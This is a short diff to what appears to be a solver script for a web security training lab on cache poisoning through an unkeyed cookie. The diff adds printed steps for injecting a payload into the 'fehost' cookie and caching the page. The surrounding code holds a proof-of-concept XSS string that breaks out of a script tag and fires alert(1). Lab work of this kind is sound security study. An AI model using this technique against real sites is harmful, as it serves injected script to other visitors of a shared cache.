@@ -8,6 +8,9 @@ LAB_NAME = "Web cache poisoning with an unkeyed cookie"
 
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload into the unkeyed `fehost` cookie\n2. Send multiple request to the main page to cache it with the injected payload\n""")
+
     url = url.rstrip('/')
 
     payload = """ "}</script><img src=1 onerror=alert(1)> """
